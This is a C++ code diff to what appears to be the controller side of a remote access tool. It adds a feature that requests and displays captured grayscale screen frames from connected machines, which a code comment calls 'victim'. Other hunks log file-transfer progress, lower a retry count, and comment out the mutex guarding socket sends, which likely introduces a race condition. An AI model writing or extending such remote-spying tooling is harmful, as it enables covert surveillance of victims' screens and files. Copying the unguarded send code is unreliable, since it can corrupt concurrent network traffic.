@@ -90,6 +90,12 @@ void Controller::controlWindow()
                 p << sf::Uint8('x');
                 sendServer(p);
             }
+            if (sharingScreen) {
+                sf::Packet p;
+                p << sf::Uint8('g');
+                sendServer(p);
+                sharingScreen = false;
+            }
         }
 
         //catch windows events
@@ -195,13 +201,30 @@ void Controller::controlWindow()
                     std::thread sendFile(&Controller::startSendingFile, this);
                     sendFile.detach();
                 }
+                else if (key == 4) {
+                    sharingScreen = !sharingScreen;
+                    if (sharingScreen) {
+                        sf::Packet p;
+                        p << sf::Uint8('b') << sf::Uint16(0) << sf::Uint16(0) << sf::Uint16(10'000) << sf::Uint16(10'000);
+                        sendServer(p);
+                    }
+                    else {
+                        sf::Packet p;
+                        p << sf::Uint8('g');
+                        sendServer(p);
+                    }
+                }
             }
 
             keys[i] = state;
         }
 
+        //draw everything
         sf::RectangleShape rect(sf::Vector2f(1920, 1080));
-        rect.setTexture(&wallpaper);
+        if (!sharingScreen)
+            rect.setTexture(&wallpaper);
+        else
+            rect.setTexture(&screen);
         w.draw(rect);
 
         std::string str("SETTINGS [ins] = ");
@@ -220,8 +243,12 @@ void Controller::controlWindow()
         else if (fileState > 0)
             str += std::to_string(fileState) + "/" + std::to_string(fileSize) + 
             " BYTES - " + std::to_string(int((fileState * 100.f) / fileSize)) + "%";
+        str += "\nSCREEN SHARING [4] = ";
+        str += ((sharingScreen) ? "ACTIVE\n" : "INACTIVE\n");
 
         sf::Text txt(str, font, 20);
+        txt.setStyle(sf::Text::Bold);
+        txt.setFillColor(sf::Color(200, 200, 200));
         txt.setPosition(8, 6);
         txt.setLineSpacing(1.4);
         w.draw(txt);
@@ -243,8 +270,6 @@ void Controller::receiveInfo()
 
         sf::Uint8 cmd;
         p >> cmd;
-
-        std::cout << cmd;
 
         //add new controller/victim info
         if (cmd == 'n' || cmd == 'l') {
@@ -339,6 +364,24 @@ void Controller::receiveInfo()
             file->close();
             delete file;
             file = nullptr;
+        }
+        //receive frame
+        else if (cmd == 't') {
+            auto data = static_cast<const char*>(p.getData());
+            data++;
+
+            sf::Image img;
+            img.create(1280, 720);
+
+            for (int y = 0; y < 720; y++) {
+                for (int x = 0; x < 1280; x++) {
+                    auto col = data[y * 1280 + x];
+
+                    img.setPixel(x, y, sf::Color(col, col, col));
+                }
+            }
+
+            screen.loadFromImage(img);
         }
     }
 }
@@ -594,7 +637,7 @@ init:
     sf::Uint8 version = 0;
     p >> version;
     if (version != CONTROLLER_VERSION) {
-        if (fails < 20) {
+        if (fails < 10) {
             fails++;
             goto init;
         }
@@ -670,9 +713,9 @@ void Controller::startSendingFile()
 
 sf::Socket::Status Controller::sendServer(sf::Packet& p)
 {
-    mutex.lock();
+    //mutex.lock();
     auto state = server.send(p);
-    mutex.unlock();
+    //mutex.unlock();
 
     return state;
 }
